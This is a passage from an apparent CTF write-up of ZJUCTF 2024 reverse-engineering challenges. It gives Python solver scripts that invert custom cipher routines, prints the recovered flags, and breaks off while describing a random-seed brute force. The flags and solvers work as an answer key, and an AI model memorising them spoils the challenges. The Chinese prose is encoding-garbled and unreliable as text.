class="hljs-number">0x2FB3FF</span>, <span class="hljs-number">0x4F323E1F</span>, <span class="hljs-number">0xA4A33E52</span>,<br>    <span class="hljs-number">0x8F21</span>, <span class="hljs-number">0xD19B8275</span>, <span class="hljs-number">0x36A6BBF6</span>, <span class="hljs-number">0x7FB1E8AC</span>, <span class="hljs-number">0x19B867B0</span>, <span class="hljs-number">0x7383FB6</span>, <br>    <span class="hljs-number">0x5283BD2E</span>, <span class="hljs-number">0xFFF5</span>, <span class="hljs-number">0xE4CDA88D</span>, <span class="hljs-number">0xCECEEEF8</span>, <span class="hljs-number">0x6EBF11CF</span>, <span class="hljs-number">0x4B50B9B8</span>, <br>    <span class="hljs-number">0x286B6DBE</span>, <span class="hljs-number">0xB3F3EB41</span>, <span class="hljs-number">0x87F5</span><br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">n2l</span>(<span class="hljs-params">li</span>):<br>    new = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>        tmp = i<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            new.append(tmp%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>))<br>            tmp = tmp&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> new<br>lis1 = n2l(numbers[:<span class="hljs-number">7</span>])[:<span class="hljs-number">26</span>]<br>lis2 = n2l(numbers[<span class="hljs-number">7</span>:<span class="hljs-number">14</span>])[:<span class="hljs-number">26</span>]<br>lis3 = n2l(numbers[<span class="hljs-number">14</span>:])[:<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis1])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis2])<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis3])<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">das</span>(<span class="hljs-params">al,af,cf</span>):<br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0x0F</span>) &gt; <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> af:<br>        al -= <span class="hljs-number">0x06</span><br>    <span class="hljs-keyword">if</span> (al &amp; <span class="hljs-number">0xF0</span>) &gt; <span class="hljs-number">0x90</span> <span class="hljs-keyword">or</span> cf:<br>        al -= <span class="hljs-number">0x60</span><br>    <span class="hljs-keyword">return</span> al &amp; <span class="hljs-number">0xFF</span><br><br>flag  = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string.printable:<br>        AL = (<span class="hljs-built_in">ord</span>(j)-lis1[i])%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        af,cf = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">ord</span>(j)&amp;<span class="hljs-number">0xf</span>)-(lis1[i]&amp;<span class="hljs-number">0xf</span>))&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(j)-lis1[i])&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>        <span class="hljs-comment"># print(af,cf)</span><br>        AL = das(AL,af,cf)<br>        res = (lis2[i]+AL)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> res==lis3[i]:<br>            flag+=j<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># ZJUCTF&#123;welc0me-2-reverse!&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/20.png"></li></ul><h2 id="rev3">rev3</h2><ul><li>æ”¾åˆ°idaé‡Œä¸€çœ‹ï¼Œç”šè‡³è¿˜æ²¡æœ‰å»ç¬¦å·è¡¨ï¼Œä¸€é“ç®€å•çš„é€†å‘é¢˜ç›®ï¼Œrandç§å­ä¹Ÿæœ‰äº†ï¼Œé‚£ä¹ˆrandç»“æœéƒ½æ˜¯ç¡®å®šçš„: <img src="/img/zjuctf2024/21.png"></li><li>æŠŠæ¯ä¸ªå‡½æ•°é€†å‘ä¸€ä¸‹ï¼Œå†æ•´ä¸ªé€†å‘ï¼Œè¿èµ·æ¥å°±å¥½äº†ï¼Œå°±æ˜¯æœ‰ç‚¹çƒ¦: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python">sbox = [<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <br><span class="hljs-number">0x57</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x93</span>, <br><span class="hljs-number">0x45</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x65</span>, <br><span class="hljs-number">0x92</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xCE</span>, <br><span class="hljs-number">0x3E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE1</span>, <br><span class="hljs-number">0x39</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD6</span>, <br><span class="hljs-number">0x51</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xCC</span>, <br><span class="hljs-number">0xB0</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x99</span>, <br><span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB7</span>, <br><span class="hljs-number">0xA9</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xDE</span>, <br><span class="hljs-number">0x1B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x22</span>, <br><span class="hljs-number">0xFE</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x08</span>, <br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x7D</span>, <br><span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xFF</span>, <br><span class="hljs-number">0x64</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDB</span>, <br><span class="hljs-number">0x8A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x83</span>, <br><span class="hljs-number">0x02</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x7F</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x3B</span>, <br><span class="hljs-number">0x81</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x79</span>, <br><span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xB6</span>, <br><span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x71</span>, <br><span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x72</span>, <br><span class="hljs-number">0x07</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2A</span>, <br><span class="hljs-number">0x68</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBB</span>, <br><span class="hljs-number">0xC9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x80</span>, <br><span class="hljs-number">0x9E</span><br>]<br>ans = [<br><span class="hljs-number">0xE6</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xF7</span>, <br><span class="hljs-number">0x71</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x13</span>, <br><span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x82</span><br>]<br>rand = []<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;random_numbers.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rand.append(<span class="hljs-built_in">int</span>(i))<br><span class="hljs-comment"># print(rand)</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sbox)==<span class="hljs-number">256</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ans)==<span class="hljs-number">28</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b2w</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">4</span>):<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> lis[i:i+<span class="hljs-number">4</span>][::-<span class="hljs-number">1</span>]:<br>            tmp = tmp*<span class="hljs-number">256</span>+j<br>        newlis.append(tmp)<br>    <span class="hljs-keyword">return</span> newlis<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= randnum<br>        randnum = (randnum+<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc1</span>(<span class="hljs-params">flaglis,randnum</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= (randnum+i*<span class="hljs-number">16909060</span>)&amp;<span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc1(func1(testflaglis,rand[<span class="hljs-number">0</span>]),rand[<span class="hljs-number">0</span>])==testflaglis<br><br>testflaglis = func1(testflaglis,rand[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &gt;&gt; bits) | (value &lt;&lt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol32</span>(<span class="hljs-params">value, bits</span>):<br>    mask = <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> ((value &lt;&lt; bits) | (value &gt;&gt; (<span class="hljs-number">32</span> - bits))) &amp; mask<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">7</span>)-index<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32(flaglis[i],<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc2</span>(<span class="hljs-params">flaglis,index</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        flaglis[i] = rol32(flaglis[i],<span class="hljs-number">12</span>)<br>        flaglis[i] ^= <span class="hljs-number">570619159</span> - i<br>        flaglis[i] = ror32((flaglis[i]+index),<span class="hljs-number">7</span>)<br>        flaglis[i] ^= index+<span class="hljs-number">270817907</span><br>    <span class="hljs-keyword">return</span> flaglis<br><br><span class="hljs-keyword">assert</span> revfunc2(func2(testflaglis,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>)==testflaglis<br><br>testflaglis = func2(testflaglis,<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w2b</span>(<span class="hljs-params">lis</span>):<br>    newlis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            newlis.append(lis[i]%<span class="hljs-number">256</span>)<br>            lis[i] = lis[i]&gt;&gt;<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> newlis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findsbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        tmp.append(sbox[i])<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfindbox</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> w2b(flaglis):<br>        <span class="hljs-comment"># print(i,tmp)</span><br>        tmp.append(sbox.index(i))<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfindbox(findsbox(testflaglis)))<br><span class="hljs-keyword">assert</span> revfindbox(findsbox(testflaglis))==testflaglis<br><br>testflaglis = findsbox(testflaglis)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    flaglis = b2w(tmp)<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revfunc3</span>(<span class="hljs-params">flaglis</span>):<br>    tmp = w2b(flaglis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>        tmp[i+<span class="hljs-number">1</span>] ^= tmp[i]<br>        tmp[i] ^= tmp[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> b2w(tmp)<br><br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-built_in">print</span>(revfunc3(func3(testflaglis)))<br><span class="hljs-keyword">assert</span> revfunc3(func3(testflaglis))==testflaglis<br><br><span class="hljs-built_in">print</span>()<br><br>testflag = <span class="hljs-string">b&quot;ZJUCTF&#123;AAAAAAAAAAAAAAAAAAAA&#125;&quot;</span><br>testflaglis = b2w(testflag)<br><span class="hljs-built_in">print</span>(testflaglis)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whole</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        flaglis = func1(flaglis,rand[i])<br>        flaglis = func2(flaglis,i)<br>        flaglis = findsbox(flaglis)<br>        flaglis = func3(flaglis)<br>    flaglis = func1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">revwhole</span>(<span class="hljs-params">flaglis</span>):<br>    flaglis = revfunc1(flaglis,rand[<span class="hljs-number">20</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        flaglis = revfunc3(flaglis)<br>        flaglis = revfindbox(flaglis)<br>        flaglis = revfunc2(flaglis,i)<br>        flaglis = revfunc1(flaglis,rand[i])<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-built_in">print</span>(revwhole(whole(testflaglis)))<br><span class="hljs-built_in">print</span>()<br><br>flaglis = b2w(ans)<br>flaglis = w2b(revwhole(flaglis))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment"># ZJUCTF&#123;s0_EaSy_2_gE7_@n$W3R&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="ä¸­aå£ç®—">ä¸­Aå£ç®—</h2><ul><li><p>æ”¾åˆ°idaé‡ŒæŸ¥çœ‹ï¼Œå‘ç°éšæœºæ•°æ˜¯ç”¨time(0)éšæœºç§å­è·å–çš„ï¼Œç„¶åå¯ä»¥ä¸€æ¬¡æ€§è¾“å…¥0x1000ä¸ªç­”æ¡ˆï¼Œç”±äºæ¯æ¬¡checkéƒ½ä¼šsleepä¸€ç§’ï¼Œå› æ­¤åªè¦éšæœºæ•°æ’åº“ï¼Œå‘ä¸‰æ¬¡0x1000ä¸ªç­”æ¡ˆï¼Œè¶…è¿‡10086åˆ†å°±å¯ä»¥æ‹¿ä¸‹: <img src="/img/zjuctf2024/23.png"></p></li><li><p>ä½†æ˜¯å®é™…ä¸Šç”¨ctypeæ’åº“å¹¶ä¸æˆåŠŸï¼Œç„¶åçœ‹åˆ°å¤§Aå£ç®—æç¤ºï¼Œå¯èƒ½ç³»ç»Ÿæ—¶é—´è¢«ä¿®æ”¹æˆå¾ˆä¹…ä»¥å‰ï¼Œäºæ˜¯çˆ†ç ´ï¼ŒèŠ±äº†ä¸€ä¸ªå°æ—¶ä¸åˆ°å°±æ’å‡ºæ¥äº†ï¼Œå¤§æ¦‚æ˜¯2010å¹´: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 